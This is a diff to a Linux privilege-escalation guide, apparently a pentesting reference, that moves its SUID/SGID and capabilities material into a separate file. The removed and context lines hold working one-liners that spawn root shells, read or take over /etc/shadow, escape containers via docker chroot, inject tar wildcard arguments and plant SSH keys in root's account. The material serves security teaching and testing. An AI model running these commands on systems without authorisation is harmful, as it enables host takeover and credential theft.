@@ -145,122 +145,15 @@ sudo git -p help  # then !/bin/bash
 sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
-### 3. SUID/SGID Binaries
+### 3. SUID/SGID Binaries and Linux Capabilities
 
-**Find SUID/SGID Files:**
-```bash
-# Find SUID binaries (4000)
-find / -perm -4000 -type f 2>/dev/null
-find / -perm -u=s -type f 2>/dev/null
+SUID/SGID binaries and file capabilities are the two most common local
+privesc vectors. Enumerate every one, then check GTFOBins for each, and
+prefer `-p` shells so privileges are not dropped. The exhaustive `find`
+enumeration, GTFOBins one-liners, and per-capability abuse catalog live
+in `references/suid-sgid-and-capabilities.md`.
 
-# Find SGID binaries (2000)
-find / -perm -2000 -type f 2>/dev/null
-find / -perm -g=s -type f 2>/dev/null
-
-# Find both SUID and SGID
-find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
-
-# Interesting locations
-find /usr/local/bin -perm -4000 2>/dev/null
-find /usr/bin -perm -4000 2>/dev/null
-find /bin -perm -4000 2>/dev/null
-```
-
-**Exploiting SUID Binaries:**
-```bash
-# Check GTFOBins for each SUID binary found
-# https://gtfobins.github.io/
-
-# Common exploitable SUID binaries:
-
-# /usr/bin/find
-find . -exec /bin/bash -p \; -quit
-
-# /usr/bin/vim
-vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
-
-# /usr/bin/nmap (old versions)
-nmap --interactive
-!sh
-
-# /usr/bin/less
-less /etc/profile
-!/bin/bash
-
-# /usr/bin/awk
-awk 'BEGIN {system("/bin/bash -p")}'
-
-# /usr/bin/perl
-perl -e 'exec "/bin/bash";'
-
-# /usr/bin/python
-python -c 'import os; os.execl("/bin/bash", "bash", "-p")'
-
-# /usr/bin/php
-php -r "pcntl_exec('/bin/bash', ['-p']);"
-
-# Custom SUID binary (check for command injection, buffer overflow)
-strings /path/to/suid_binary
-ltrace /path/to/suid_binary
-strace /path/to/suid_binary
-```
-
-### 4. Linux Capabilities
-
-**What Are Capabilities:**
-Capabilities divide root privileges into distinct units. A binary with specific capabilities can perform privileged operations without full root.
-
-**Enumerate Capabilities:**
-```bash
-# Find binaries with capabilities
-getcap -r / 2>/dev/null
-/usr/sbin/getcap -r / 2>/dev/null
-
-# Check specific binary
-getcap /usr/bin/python3.8
-
-# Check process capabilities
-cat /proc/self/status | grep Cap
-getpcaps $$
-
-# Decode capability value
-capsh --decode=0000003fffffffff
-```
-
-**Exploitable Capabilities:**
-```bash
-# cap_setuid - allows changing UID
-# Python with cap_setuid
-python -c 'import os; os.setuid(0); os.system("/bin/bash")'
-
-# Perl with cap_setuid
-perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
-
-# cap_dac_read_search - bypass file read permission checks
-# tar with cap_dac_read_search
-tar cvf shadow.tar /etc/shadow
-tar -xvf shadow.tar
-
-# cap_chown - change file ownership
-# Python with cap_chown
-python -c 'import os; os.chown("/etc/shadow",1000,1000)'
-
-# cap_sys_admin - various admin operations (often container escape)
-# Can mount filesystems, load kernel modules, etc.
-
-# cap_sys_ptrace - inject code into processes
-# gdb with cap_sys_ptrace
-gdb -p <PID>
-call system("id")
-
-# cap_sys_module - load kernel modules
-# Can load malicious kernel module for root
-
-# cap_net_raw + cap_net_admin - network packet manipulation
-# tcpdump with these caps can be used for ARP spoofing
-```
-
-### 5. Cron Jobs Exploitation
+### 4. Cron Jobs Exploitation
 
 **Enumerate Cron Jobs:**
 ```bash
@@ -311,7 +204,7 @@ touch -- --checkpoint-action=exec=exploit.sh
 # When tar runs with wildcard, it executes exploit.sh
 ```
 
-### 6. Writable Files and Directories
+### 5. Writable Files and Directories
 
 **Find Writable Files:**
 ```bash
@@ -348,7 +241,7 @@ ssh-keygen -t rsa
 cat ~/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
 ```
 
-### 7. Container Escape
+### 6. Container Escape
 
 **Detect if in Container:**
 ```bash
@@ -387,7 +280,7 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 kubectl --token=$(cat /run/secrets/kubernetes.io/serviceaccount/token) get pods
 ```
 
-### 8. Password Hunting
+### 7. Password Hunting
 
 **Search for Passwords:**
 ```bash
@@ -424,7 +317,7 @@ find / -name id_dsa 2>/dev/null
 find / -name authorized_keys 2>/dev/null
 ```
 
-### 9. Kernel Exploits and NFS
+### 8. Kernel Exploits and NFS
 
 Last-resort paths, kept out of line because they are rarely the right answer
 and are unstable when they are. See `references/kernel-and-nfs.md` for
@@ -492,8 +385,10 @@ chmod +x pspy64
 - Check AppArmor/SELinux is not blocking
 - Try different attack vector
 
-## Reference Links
+## References
 
+- [references/suid-sgid-and-capabilities.md](references/suid-sgid-and-capabilities.md) — SUID/SGID and capabilities enumeration/exploitation catalog (progressive disclosure)
+- [references/kernel-and-nfs.md](references/kernel-and-nfs.md) — Kernel exploit selection and `no_root_squash` NFS abuse (progressive disclosure)
 - HackTricks Linux Privesc: https://github.com/HackTricks-wiki/hacktricks/tree/master/src/linux-hardening/privilege-escalation
 - GTFOBins: https://gtfobins.github.io/
 - PEASS-ng (LinPEAS): https://github.com/carlospolop/PEASS-ng
